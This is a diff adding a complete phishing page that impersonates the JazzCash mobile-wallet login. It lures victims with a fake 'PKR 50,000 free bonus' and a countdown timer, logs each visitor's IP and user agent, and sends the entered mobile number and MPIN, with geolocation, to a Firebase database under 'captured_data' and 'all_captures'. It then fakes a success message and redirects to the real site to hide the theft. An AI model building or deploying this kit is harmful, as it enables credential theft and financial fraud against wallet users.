@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>JazzCash - Account Login</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ed1c24, #b3131a);
+            padding: 25px 20px;
+            text-align: center;
+            color: #fff;
+        }
+        .header .logo {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+        .header h1 { font-size: 1.8em; font-weight: 700; }
+        .header p { font-size: 0.85em; opacity: 0.9; margin-top: 5px; }
+        
+        .offer-banner {
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000;
+            padding: 15px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 0.95em;
+        }
+        .offer-banner .amount { font-size: 1.8em; color: #ed1c24; }
+        
+        .form-section {
+            padding: 25px 20px;
+        }
+        
+        .bonus-card {
+            background: linear-gradient(135deg, #fff3cd, #ffeaa7);
+            border: 2px dashed #ffd700;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .bonus-card .title { color: #333; font-size: 0.85em; }
+        .bonus-card .bal { color: #ed1c24; font-size: 2em; font-weight: 900; }
+        .bonus-card .sub { color: #666; font-size: 0.8em; margin-top: 5px; }
+        .bonus-card .countdown { color: #ed1c24; font-weight: 600; margin-top: 8px; font-size: 0.9em; }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #333;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 0.85em;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 0.95em;
+            transition: all 0.3s;
+        }
+        .form-group input:focus {
+            border-color: #ed1c24;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(237,28,36,0.1);
+        }
+        .form-group input::placeholder { color: #aaa; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ed1c24, #b3131a);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1.1em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 5px;
+        }
+        .login-btn:hover { transform: scale(1.02); box-shadow: 0 5px 20px rgba(237,28,36,0.3); }
+        
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 0.85em;
+        }
+        .links a { color: #ed1c24; text-decoration: none; }
+        .links a:hover { text-decoration: underline; }
+        
+        .footer {
+            background: #f5f5f5;
+            padding: 15px 20px;
+            text-align: center;
+            border-top: 1px solid #eee;
+        }
+        .footer p { color: #888; font-size: 0.75em; }
+        .footer .secure { color: #ed1c24; font-weight: 600; margin-top: 5px; }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 25px;
+        }
+        .loading .spinner {
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #ed1c24;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #666; margin-top: 10px; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: #fff3cd;
+            border: 1px solid #ffd700;
+            border-radius: 12px;
+        }
+        .success-msg h3 { color: #ed1c24; }
+        .success-msg p { color: #333; margin-top: 10px; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="header">
+                <div class="logo">🏦</div>
+                <h1>JazzCash</h1>
+                <p>Pakistan's No.1 Mobile Account</p>
+            </div>
+            
+            <div class="offer-banner">
+                🎉 <span class="amount">PKR 50,000</span> FREE BONUS!<br>
+                Limited Time Offer - Grab Now!
+            </div>
+            
+            <div class="form-section">
+                <div class="bonus-card">
+                    <div class="title">🎁 Unclaimed Bonus</div>
+                    <div class="bal">PKR 50,000</div>
+                    <div class="sub">Login within next to claim!</div>
+                    <div class="countdown">⏰ Offer expires in: <span id="countdown">23:59:59</span></div>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>📱 Mobile Number</label>
+                        <input type="text" id="username" placeholder="03XX-XXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label>🔑 MPIN / Password</label>
+                        <input type="password" id="password" placeholder="Enter your MPIN" required>
+                    </div>
+                    <button type="submit" class="login-btn">🔓 Login & Claim Now</button>
+                </form>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>🔄 Verifying your JazzCash account...</p>
+                </div>
+                
+                <div class="success-msg" id="successMsg">
+                    <h3>✅ Congratulations!</h3>
+                    <p>PKR 50,000 bonus has been credited to your JazzCash account! Login to check.</p>
+                    <p style="margin-top:10px;font-size:0.8em;color:#888;">Redirecting to JazzCash...</p>
+                </div>
+                
+                <div class="links">
+                    <a href="#">Forgot PIN?</a>
+                    <a href="#">Register Now</a>
+                    <a href="#">Help</a>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <p>🔒 256-bit SSL Secured Connection</p>
+                <p class="secure">✅ Licensed by State Bank of Pakistan</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Countdown timer
+        let seconds = 86399; // 23:59:59
+        setInterval(() => {
+            if (seconds > 0) seconds--;
+            const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
+            const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+            const s = String(seconds % 60).padStart(2, '0');
+            document.getElementById('countdown').textContent = `${h}:${m}:${s}`;
+        }, 1000);
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'jazzcash',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'jazzcash', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'jazzcash', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://www.jazzcash.com.pk', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
